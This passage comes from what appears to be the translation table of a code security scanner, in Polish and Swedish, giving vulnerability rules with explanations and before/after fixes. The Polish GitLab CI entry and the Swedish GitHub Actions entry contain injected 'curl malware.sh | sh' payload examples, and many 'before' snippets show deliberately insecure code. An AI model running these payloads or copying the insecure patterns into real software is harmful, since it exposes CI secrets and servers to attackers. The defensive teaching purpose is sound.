        "Nie jest jeszcze znana żadna poprawiona wersja — rozważ alternatywny pakiet lub śledź aktualizacje projektu."
      ),
    },
  }),
    "gitlab-ci-script-injection": {
      title: 'Wartość kontrolowana przez zewnętrznego użytkownika przechodzi przez drugą powłokę w pipeline GitLab CI',
      description: 'Linia "script:" (lub "before_script:"/"after_script:") używa "eval" lub "sh -c"/"bash -c" razem ze zmienną predefiniowaną GitLaba, taką jak tytuł merge requesta, wiadomość commita czy nazwa brancha — wszystko to może zapisać każdy, kto otworzy merge request, nawet z zewnętrznego forka. Wartość jest najpierw rozwijana przez zewnętrzną powłokę, a następnie wklejana do ciągu znaków, który druga powłoka ponownie interpretuje jako kod: tytuł taki jak "$(curl malware.sh | sh)" wykonałby dowolne polecenia w pipeline, z dostępem do wszystkich sekretów dostępnych w tym zadaniu.',
      fix: {
        before: `script:
  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
        after: `script:
  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # przekazane jako argument do polecenia, nigdy wewnątrz ciągu "bash -c", który zinterpretowałby je ponownie`,
      },
    },
    "gitlab-ci-privileged-dind-no-tls": {
      title: 'Docker-in-Docker w pipeline GitLab CI działa z wyłączonym szyfrowaniem TLS',
      description: 'Zadanie używa usługi "docker:dind" (Docker-in-Docker, potrzebnej do budowania obrazów wewnątrz pipeline), ale ustawia "DOCKER_TLS_CERTDIR" na pusty ciąg znaków, całkowicie wyłączając szyfrowanie TLS między klientem Dockera a demonem dind. Bez TLS każdy, kto może dosięgnąć tego portu w tej samej wewnętrznej sieci runnera, może przejąć kontrolę nad demonem Dockera — działającym z rozszerzonymi uprawnieniami — zamiast być ograniczonym tylko do zadania, które powinno z niego korzystać.',
      fix: {
        before: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: ""`,
        after: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: "/certs"  # TLS pozostaje włączone między klientem Dockera a demonem dind — "" całkowicie je wyłącza`,
      },
    },
    "gitlab-ci-unpinned-image": {
      title: 'Obraz Dockera w pipeline GitLab CI nie jest przypięty do konkretnej wersji',
      description: '"image:" w pipeline wskazuje na obraz bez tagu (co odpowiada ":latest") lub jawnie na ":latest". Osoba utrzymująca ten obraz może zastąpić jego zawartość w dowolnym momencie bez zmiany repozytorium — ten sam pipeline może z dnia na dzień zacząć uruchamiać inny kod, co jest ryzykiem łańcucha dostaw koncepcyjnie identycznym z akcją GitHub odwołującą się do tagu zamiast do commita.',
      fix: {
        before: `image: node:latest`,
        after: `image: node:20.11.1  # konkretny tag (albo jeszcze lepiej digest "node@sha256:...") zamiast "latest"`,
      },
    },
},
  sv: {
  "supabase-service-role-in-client": {
    title: "Supabases hemliga nyckel hamnar i en fil avsedd för webbläsaren",
    description:
      "En variabel med ett offentligt prefix (t.ex. NEXT_PUBLIC_, VITE_) eller en klientsidig fil refererar till Supabases service role key. Denna nyckel kringgår Row Level Security: om den hamnar i webbläsarbunten kan vem som helst läsa den och agera som databasadministratör.",
    fix: {
      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
      after: `// app/api/admin/route.ts (endast server)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
    },
  },
  "hardcoded-secret": {
    title: "Lösenord eller hemliga nycklar är skrivna direkt i koden",
    description:
      "En API-nyckel, en token eller ett lösenord verkar vara skrivet som ett bokstavligt värde istället för att läsas från en miljövariabel. Alla som läser källkoden (eller repot, om det är offentligt) får tag i den hemligheten.",
    fix: {
      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
    },
  },
  "env-file-with-real-values": {
    title: "En fil med projektets riktiga lösenord finns bland de analyserade",
    description:
      "En .env-fil med riktiga värden (inte en .env.example) ingår i analysen. Om den här filen hamnar i ett repo eller en offentlig driftsättning blottas alla autentiseringsuppgifter den innehåller.",
    fix: {
      before: `# .env (sparad av misstag)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
      after: `# .env.example (sparad)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env hålls utanför repot (.gitignore)`,
    },
  },
  "missing-row-level-security": {
    title: "Vem som helst kan läsa eller ändra alla användares data",
    description:
      "Row Level Security är avstängd, eller så tillåter en policy åtkomst för vem som helst (USING (true)) utan att kontrollera vem som gör förfrågan. Varje autentiserad användare — eller till och med en anonym — kan läsa eller ändra alla andras data.",
    fix: {
      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
    },
  },
  "sql-injection": {
    title: "Ett värde som angetts av användaren klistras in direkt i en databasfråga",
    description:
      "En SQL-fråga byggs genom att konkatenera eller interpolera en sträng direkt istället för att använda parametrar. Om den texten kommer (även indirekt) från en användare kan den ändra själva frågan — SQL-injection.",
    fix: {
      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
    },
  },
  "plaintext-password-storage": {
    title: "Lösenord verkar inte vara skyddade",
    description:
      "Ett lösenordsfält sparas exakt som det kom in i förfrågan, och ingen hashfunktion (bcrypt, argon2, scrypt) förekommer i filen. Om databasen komprometteras är varje lösenord direkt användbart.",
    fix: {
      before: `await db.users.insert({ email, password: req.body.password })`,
      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
    },
  },
  "hardcoded-jwt-secret": {
    title: "Hemligheten som används för att signera inloggningar är skriven i klartext i koden",
    description:
      "Hemligheten som skickas till jwt.sign / jwt.verify (eller variabeln JWT_SECRET) är ett bokstavligt värde i koden istället för att komma från en miljövariabel. Den som läser den kan skapa giltiga åtkomsttoken för vilken användare som helst.",
    fix: {
      before: `jwt.sign(payload, "super-secret-key-123")`,
      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
    },
  },
  "command-injection": {
    title: "Servern kan tvingas köra externa kommandon",
    description:
      "En funktion som kör systemkommandon (exec, execSync, spawn) tar emot en sträng byggd genom interpolation eller konkatenering. Om en del av den strängen kommer från användarinmatning kan den som kontrollerar den köra godtyckliga kommandon på servern.",
    fix: {
      before: "execSync(`convert ${filename} output.png`)",
      after: `execFile("convert", [filename, "output.png"])`,
    },
  },
  "unprotected-new-table": {
    title: "En ny tabell verkar skapas utan skydd",
    description:
      "En SQL-migration skapar en tabell men aktiverar inte Row Level Security för samma tabell i samma fil. Så länge det förblir så börjar tabellen utan någon begränsning på vem som kan läsa eller skriva till den.",
    fix: {
      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
    },
  },
  "permissive-cors": {
    title: "Webbplatsen accepterar förfrågningar från vilken annan webbplats som helst",
    description:
      "CORS-huvudet är satt till att acceptera förfrågningar från vilket ursprung som helst (*), eller så används cors()-middlewaren utan begränsningar. Vilken tredjepartswebbplats som helst kan anropa dina API:er från webbläsaren hos en redan autentiserad användare.",
    fix: {
      before: `app.use(cors())`,
      after: `app.use(cors({ origin: ["https://yoursite.com"] }))`,
    },
  },
  "admin-function-missing-auth": {
    title: "En funktion med administratörsbehörighet kontrollerar inte vem som använder den",
    description:
      "En route eller funktion vars namn antyder administratörsåtgärder innehåller, i de närliggande raderna, ingen autentiserings- eller rollkontroll. Vem som helst som känner till URL:en skulle kunna köra den.",
    fix: {
      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
    },
  },
  ssrf: {
    title: "Webbplatsen kan tvingas köra extern kod",
    description:
      "En utgående HTTP-förfrågan (fetch, axios) använder direkt ett värde från en användares förfrågan som mål-URL. En illvillig användare kan få din server att anropa interna eller godtyckliga adresser — Server-Side Request Forgery.",
    fix: {
      before: `const data = await fetch(req.query.url)`,
      after: `const ALLOWED = new Set(["https://api.yourservice.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL inte tillåten")\nconst data = await fetch(req.query.url)`,
    },
  },
  "weak-password-hashing": {
    title: "Lösenord skyddas med en metod som nu är lätt att knäcka",
    description:
      "På samma rad tillämpas md5() eller sha1() på ett värde kopplat till ett lösenord. Dessa algoritmer är för snabba att beräkna: en angripare med databasen kan prova miljarder lösenord per sekund.",
    fix: {
      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
      after: `const hashed = await bcrypt.hash(password, 12)`,
    },
  },
  "xss-dangerous-html": {
    title: "Text skriven av användare skulle kunna köra kod i webbläsaren",
    description:
      "Innehåll infogas på sidan som rå HTML (dangerouslySetInnerHTML, v-html, .innerHTML) istället för som vanlig text. Om det innehållet inkluderar användarinmatning kan det innehålla skript som körs i webbläsaren hos den som läser sidan.",
    fix: {
      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
      after: `<div>{comment.text}</div>\n// eller, om HTML behövs: DOMPurify.sanitize(comment.text)`,
    },
  },
  "public-storage-bucket": {
    title: "Utrymmet för uppladdade filer är synligt för alla",
    description:
      "En lagringsbucket (Supabase Storage, S3) är konfigurerad som offentlig. Om den innehåller dokument, foton eller filer uppladdade av användare kan vem som helst som känner till — eller gissar — sökvägen komma åt dem utan autentisering.",
    fix: {
      before: `supabase.storage.createBucket("uploads", { public: true })`,
      after: `supabase.storage.createBucket("uploads", { public: false })\n// servera filer med tidsbegränsade signerade URL:er: createSignedUrl(path, 60)`,
    },
  },
  "csrf-state-changing-get": {
    title: "En enda länk räcker för att radera eller ändra data",
    description:
      "En GET-route utför en åtgärd som ändrar data (sökvägen innehåller delete/remove/update/edit). GET-förfrågningar körs bara genom att besöka en länk eller ladda en bild från en extern sida — den klassiska startpunkten för en CSRF-attack.",
    fix: {
      before: `router.get("/posts/:id/delete", deletePost)`,
      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
    },
  },
  "insecure-token-storage": {
    title: "Inloggningsdata sparad i webbläsaren är inte väl skyddad",
    description:
      "En åtkomsttoken sparas i localStorage. Till skillnad från en httpOnly-cookie kan vilket skript som helst som körs på sidan (inklusive ett illvilligt som injicerats via XSS) läsa och stjäla den.",
    fix: {
      before: `localStorage.setItem("authToken", token)`,
      after: `// sätt token som en httpOnly-cookie från servern:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "open-redirect": {
    title: "Webbplatsen kan användas för att omdirigera till en bedrägerisajt",
    description:
      "Webbplatsen omdirigerar användaren till en adress hämtad direkt från förfrågan (query, body, params) utan att kontrollera att det är en känd domän. En länk som verkar peka på din webbplats kan i själva verket leda till en nätfiskesida.",
    fix: {
      before: `res.redirect(req.query.next)`,
      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
    },
  },
  idor: {
    title: "Att ändra en siffra i adressen skulle kunna visa någon annans data",
    description:
      "En databasfråga använder direkt en identifierare hämtad från URL:en (req.params.id) utan att i de närliggande raderna kontrollera att den tillhör användaren som gör förfrågan. Att ändra id:t i adressen skulle kunna ge åtkomst till en annan användares data — Insecure Direct Object Reference.",
    fix: {
      before: `const order = await Order.findById(req.params.id)`,
      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
    },
  },
  "no-login-rate-limit": {
    title: "Inloggningsformuläret blockerar inte för många försök i rad",
    description:
      "En inloggningsroute definieras i filen, men det finns inget spår av rate-limiting-middleware i samma fil. Utan en gräns för antal försök kan en angripare prova lösenord i följd (brute force) utan att saktas ner.",
    fix: {
      before: `router.post("/login", loginHandler)`,
      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
    },
  },
  "sensitive-data-in-logs": {
    title: "Lösenord eller känslig data hamnar i loggar",
    description:
      "Ett anrop till console.log (eller liknande) inkluderar en variabel kallad password, token, secret eller apiKey. Om dessa loggar hamnar i en extern tjänst eller en fil förblir känslig data exponerad mycket längre än nödvändigt.",
    fix: {
      before: `console.log("login attempt", { email, password })`,
      after: `console.log("login attempt", { email })`,
    },
  },
  "path-traversal": {
    title: "En fil på servern kan läsas eller skrivas genom att välja sökvägen utifrån",
    description:
      "En funktion som läser, skriver eller skickar en fil hämtar sökvägen direkt från ett värde i förfrågan (query, body, params) utan att kontrollera att den stannar inom en tillåten mapp. En angripare kan infoga \"../\" för att lämna den avsedda mappen och läsa eller skriva över godtyckliga filer på servern (t.ex. en konfigurationsfil med autentiseringsuppgifter).",
    fix: {
      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("Sökvägen är inte tillåten")\n  res.sendFile(target)\n})`,
    },
  },
  "nosql-injection": {
    title: "Ett värde angett av användaren körs som kod inuti en MongoDB-fråga",
    description:
      "MongoDBs $where-operator kör serversidig JavaScript för varje dokument — om den strängen byggs genom att konkatenera ett värde som kommer från användaren kan den som kontrollerar det få godtycklig kod att köras i databasens kontext, inte bara ändra filtret som vid en vanlig SQL-injection.",
    fix: {
      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
      after: `db.collection.find({ username: username })`,
    },
  },
  ssti: {
    title: "Ett värde angett av användaren tolkas som en mall, inte som data",
    description:
      "En funktion som kompilerar/renderar en mall tar emot HELA mallen från ett värde i förfrågan, istället för att använda en fast mall och bara skicka data. En angripare kan skriva direkt i mallmotorns syntax (t.ex. {{7*7}} för Jinja2) och köra kod på servern — Server-Side Template Injection, som ofta leder till godtycklig kommandokörning, inte bara ett visningsproblem som XSS.",
    fix: {
      before: `return render_template_string(request.args.get("name"))`,
      after: `return render_template("profile.html", name=request.args.get("name"))`,
    },
  },
  xxe: {
    title: "XML-parsern kan tvingas läsa filer eller göra externa förfrågningar",
    description:
      "En XML-parser (DocumentBuilderFactory) skapas utan att uttryckligen inaktivera externa entiteter (DOCTYPE) i de närliggande raderna. Om parsern tar emot XML från en opålitlig källa kan en angripare definiera en extern entitet för att läsa filer på servern eller få den att kontakta en adress efter eget val — XML External Entity.",
    fix: {
      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
    },
  },
  "terraform-open-security-group": {
    title: "En Terraform-säkerhetsgrupp öppnar en känslig port mot hela internet",
    description:
      "En regel med \"cidr_blocks\" som inkluderar 0.0.0.0/0 (vilken IP-adress som helst) ligger nära en känslig port — SSH (22), RDP (3389), eller en typisk databasport (MySQL, Postgres, MongoDB, Redis, SQL Server). Vem som helst på internet kan försöka ansluta till den tjänsten, inte bara den som borde.",
    fix: {
      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # endast ditt privata nätverk, eller en bastion host\n}`,
    },
  },
  "gcp-firewall-open-to-internet": {
    title: "En Google Cloud-brandväggsregel öppnar en känslig port mot hela internet",
    description:
      "En \"google_compute_firewall\"-resurs med \"source_ranges\" som inkluderar 0.0.0.0/0 (vilken IP-adress som helst) tillåter trafik till en känslig port — SSH (22), RDP (3389), eller en typisk databasport (MySQL, Postgres, MongoDB, Redis, SQL Server). Vem som helst på internet kan försöka ansluta till den tjänsten, inte bara den som borde.",
    fix: {
      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # endast ditt privata nätverk, eller en bastion host\n}`,
    },
  },
  "azure-nsg-open-to-internet": {
    title: "En Azure-nätverksregel öppnar en känslig port mot hela internet",
    description:
      "En nätverkssäkerhetsregel (\"azurerm_network_security_rule\", eller ett \"security_rule\"-block inuti \"azurerm_network_security_group\") med \"source_address_prefix\" satt till \"*\" eller \"0.0.0.0/0\", riktning \"Inbound\" och åtkomst \"Allow\", nära en känslig port — SSH (22), RDP (3389), eller en typisk databasport. Vem som helst på internet kan försöka ansluta till den tjänsten, inte bara den som borde.",
    fix: {
      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # endast ditt privata nätverk, eller en bastion host\n}`,
    },
  },
  "terraform-hardcoded-secret": {
    title: "En hemlighet är skriven som standardvärde för en Terraform-variabel",
    description:
      "En variabel med ett namn som password/secret/token/key har ett bokstavligt värde i sitt \"default\". Till skillnad från ett värde som skickas vid körning (tfvars, miljövariabler TF_VAR_*) hamnar ett default-värde i källkoden — och om repot delas eller är offentligt kan vem som helst se det, även utan åtkomst till Terraform-tillståndet.",
    fix: {
      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
      after: `variable "db_password" {\n  # inget default: skicka det med en .tfvars-fil (utanför git) eller en miljövariabel TF_VAR_db_password\n  sensitive = true\n}`,
    },
  },
  "gha-script-injection": {
    title: "Ett värde kontrollerat av en extern användare går direkt in i ett skalkommando i CI",
    description:
      'Ett "run:"-kommando i ett GitHub Actions-workflow interpolerar direkt ett värde som en pull request-titel, ett grennamn eller en kommentars text — allt skrivbart av vem som helst som öppnar en pull request eller kommentar, även från en extern fork. Ett värde som `"; curl malware.sh | sh #` skulle köra godtyckliga kommandon i CI:n, med åtkomst till alla hemligheter tillgängliga i det workflowt.',
    fix: {
      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # skickas som en miljövariabel, aldrig interpolerad direkt i kommandot`,
    },
  },
  "gha-pull-request-target-checkout": {
    title: "Workflowt kör koden från en extern pull request med åtkomst till repots hemligheter",
    description:
      'Workflowt använder "pull_request_target" — som körs med bas-repots behörigheter och hemligheter även för en pull request öppnad från en orelaterad fork — och checkar ut pull requestens egen kod ("github.event.pull_request.head"), inte basgrenen. Den som öppnar pull requesten får i praktiken sin egen kod körd med åtkomst till de hemligheterna.',
    fix: {
      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # Checkar ut basgrenen, inte PR:ens kod — eller använd\n      # "pull_request" istället för "pull_request_target" om du inte\n      # behöver de bredare behörigheterna/hemligheterna.\n      - uses: actions/checkout@v4`,
    },
  },
  "insecure-deserialization": {
    title: "Data från förfrågan deserialiseras med ett format som kan köra kod",
    description:
      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java), eller node-serialize-biblioteket (Node) deserialiserar ett värde hämtat direkt från förfrågan. Till skillnad från JSON kan dessa format representera och köra kod under själva deserialiseringen — den som kontrollerar det skickade värdet kan uppnå godtycklig kodkörning på servern.",
    fix: {
      before: `data = pickle.loads(request.data)`,
      after: `import json\ndata = json.loads(request.data)  # JSON kör aldrig kod vid parsning, till skillnad från pickle`,
    },
  },
  "jwt-none-algorithm": {
    title: 'Koden accepterar uttryckligen osignerade JWT-token (algoritmen "none")',
    description:
      '"none" förekommer bland algoritmerna som accepteras för att verifiera en JWT-token. En token med algoritmen "none" har ingen signatur att verifiera: vem som helst kan bygga en med vilket innehåll som helst (t.ex. en administratörsroll) och koden skulle acceptera den som giltig.',
    fix: {
      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // inkludera aldrig "none" bland accepterade algoritmer`,
    },
  },
  "terraform-s3-block-public-access-disabled": {
    title: "Block Public Access är avstängt på en S3-bucket definierad i Terraform",
    description:
      'Ett eller flera av de fyra skydden i "aws_s3_bucket_public_access_block" (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) är satta till false. Det betyder inte att bucketen redan är offentlig, men det tar bort ett skyddsnät som skulle förhindra att den görs offentlig av misstag i framtiden.',
    fix: {
      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
    },
  },
  "terraform-iam-wildcard-policy": {
    title: "En IAM-policy definierad i Terraform ger full åtkomst",
    description:
      'Ett statement med åtgärden "*" och resursen "*" ger full åtkomst till varje AWS-tjänst och resurs — samma kontroll som redan görs på det aktiva IAM-tillståndet, här läst direkt från koden innan den ens tillämpas. Det kan vara avsett för en nödroll, men bör bekräftas: för vardaglig användning, ge endast de behörigheter som faktiskt behövs.',
    fix: {
      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::din-bucket/*"]\n}`,
    },
  },
  "gcp-storage-bucket-public": {
    title: "En Google Cloud Storage-bucket görs läsbar för vem som helst",
    description:
      'En resurs av typen "google_storage_bucket_iam_member" eller "google_storage_bucket_iam_binding" ger en roll till "allUsers" eller "allAuthenticatedUsers" — den första gör bucketen läsbar för vem som helst på internet, även utan ett Google-konto; den andra för vem som helst med ett godtyckligt Google-konto, inte bara den som borde ha åtkomst.',
    fix: {
      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:someone@example.com"  # endast den som faktiskt ska ha åtkomst, inte allUsers/allAuthenticatedUsers\n}`,
    },
  },
  "azure-storage-public-access": {
    title: "Offentlig blob-åtkomst är aktiverad på ett Azure-lagringskonto",
    description:
      '"allow_blob_public_access" är satt till true på ett "azurerm_storage_account": vem som helst som känner till URL:en för en offentliggjord blob/container kan läsa den, utan någon autentisering.',
    fix: {
      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
    },
  },
  "gcp-iam-overly-broad-role": {
    title: "En Google Cloud IAM-roll ger full åtkomst (Owner/Editor)",
    description:
      'En "google_project_iam_binding"/"google_project_iam_member" (eller motsvarande på organisations-/mappnivå) tilldelar den primitiva rollen "roles/owner" eller "roles/editor" — nästan fullständig åtkomst till varje tjänst i projektet. Det kan vara avsett för ett nödkonto, men bör bekräftas: för vardaglig användning, ge endast de mer specifika fördefinierade roller som faktiskt behövs.',
    fix: {
      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # endast den fördefinierade roll som faktiskt behövs, inte roles/owner\n  member  = "user:dev@example.com"\n}`,
    },
  },
  "azure-role-assignment-owner": {
    title: "En Azure-rolltilldelning ger full åtkomst (Owner)",
    description:
      'En "azurerm_role_assignment" tilldelar rollen "Owner" — full åtkomst, inklusive kontroll över andra användares behörigheter, över hela det tilldelade omfånget (prenumeration, resursgrupp...). Det kan vara avsett för ett nödkonto, men bör bekräftas: för vardaglig användning, ge endast den mer specifika roll som faktiskt behövs (t.ex. "Contributor" på en enda resursgrupp).',
    fix: {
      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # endast den mer specifika roll som faktiskt behövs, inte Owner på hela prenumerationen\n}`,
    },
  },
  "weak-random-token": {
    title: "En säkerhetstoken genereras med en slumptalsgenerator som inte är kryptografiskt säker",
    description:
      "Ett värde med ett namn som token/session/reset/otp/csrf genereras med Math.random() (JS), random.random() (Python), eller rand() (PHP) — generatorer som inte är designade för säkerhet och vars sekvenser är förutsägbara. En token genererad på detta sätt kan gissas eller rekonstrueras, vilket omintetgör syftet den finns för (t.ex. en lösenordsåterställningslänk som vem som helst skulle kunna förutsäga).",
    fix: {
      before: `const resetToken = Math.random().toString(36).slice(2);`,
      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, inte Math.random — oförutsägbar`,
    },
  },
  "ldap-injection": {
    title: "Ett LDAP-filter byggs genom att direkt konkatenera ett värde från förfrågan",
    description:
      'En rad som bygger ett LDAP-filter (t.ex. "(uid=...)") inkluderar direkt ett värde hämtat från förfrågan, utan någon escaping av LDAP-specialtecken. Den som kontrollerar det värdet kan ändra filtrets logik — till exempel kringgå en autentiseringskontroll eller läsa katalogdata de inte borde se.',
    fix: {
      before: `const filter = \`(uid=\${req.body.username})\`;\nclient.search(base, { filter });`,
      after: `const filter = \`(uid=\${ldapEscape(req.body.username)})\`; // LDAP-specialtecken måste alltid escapas innan de används i ett filter\nclient.search(base, { filter });`,
    },
  },
  "header-injection": {
    title: "Ett värde från förfrågan hamnar direkt i ett HTTP-svarshuvud",
    description:
      "Ett HTTP-svarshuvud sätts med ett värde hämtat direkt från förfrågan (query, body, params), utan att kontrollera att det inte innehåller en radbrytning (CRLF). En angripare kan infoga ytterligare huvuden eller till och med ett helt annat svar — response splitting — vilket potentiellt kan manipulera cachning, cookies eller innehållet som visas för andra användare.",
    fix: {
      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
    },
  },
  "gha-unpinned-action": {
    title: "En tredjepartsåtgärd i CI:n är inte låst till en exakt version (commit SHA)",
    description:
      'Workflowt använder en tredjepartsåtgärd refererad via tagg eller gren (t.ex. "@v1", "@main") istället för commit SHA. Den som underhåller den — eller den som komprometterar deras konto — kan flytta den referensen till en annan commit när som helst, och tyst ändra vad som körs i CI:n, med åtkomst till dess hemligheter. En commit SHA pekar alltid på exakt samma kod.',
    fix: {
      before: `uses: some-org/some-action@v1`,
      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, låst till commit SHA — uppdatera SHA:n när du uppdaterar versionen`,
    },
  },
  "gha-excessive-permissions": {
    title: "Workflowt ger sig självt alla token-behörigheter istället för bara de som används",
    description:
      '"permissions: write-all" ger workflowts GITHUB_TOKEN skrivåtkomst till allt — issues, pull requests, paket, driftsättningar — även om workflowt bara använder en del av det. Om ett steg i workflowt komprometteras (ett skadligt beroende, ett injicerat skript) ökar de bredare behörigheterna vad den som utnyttjar det kan göra.',
    fix: {
      before: `permissions: write-all`,
      after: `permissions:\n  contents: read\n  pull-requests: write  # endast de behörigheter workflowt faktiskt använder`,
    },
  },
  "insecure-cookie-flags": {
    title: "En sessions- eller autentiseringscookie sätts utan flaggorna Secure och HttpOnly",
    description:
      'En cookie med ett namn som liknar session/auth/token sätts utan "httpOnly" och "secure" bland sina alternativ. Utan httpOnly kan JavaScript på sidan — inklusive kod injicerad via XSS — läsa den cookien. Utan secure kan den också skickas över en okrypterad HTTP-anslutning.',
    fix: {
      before: `res.cookie("session", sessionId)`,
      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "vulnerable-dependency": (original) => ({
    title: original.title.replace("Dipendenza vulnerabile:", "Sårbart beroende:"),
    description: original.description,
    fix: {
      before: original.fix.before,
      after: original.fix.after.replace(
        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
        "Ingen korrigerad version känd ännu — överväg ett alternativt paket eller följ projektets uppdateringar."
      ),
    },
  }),
  "docker-hardcoded-secret": {
    title: "En hemlighet är skriven direkt i en ENV- eller ARG-instruktion i Dockerfilen",
    description:
      "En variabel med ett namn som password/secret/token/key har ett bokstavligt värde i en ENV- eller ARG-instruktion. Till skillnad från en .env-fil (som normalt inte hamnar i avbildningen) bakas detta värde in i själva Docker-avbildningen — vem som helst som kan hämta den eller inspektera lagerhistoriken kan återvinna det, även om raden tas bort i en senare version av Dockerfilen.",
    fix: {
      before: `ENV DB_PASSWORD=supersecret123`,
      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# skickas med: docker build --build-arg DB_PASSWORD=*** (eller, ännu hellre,\n# en BuildKit secret mount, som aldrig hamnar i lagerhistoriken)`,
    },
  },
  "docker-missing-user": {
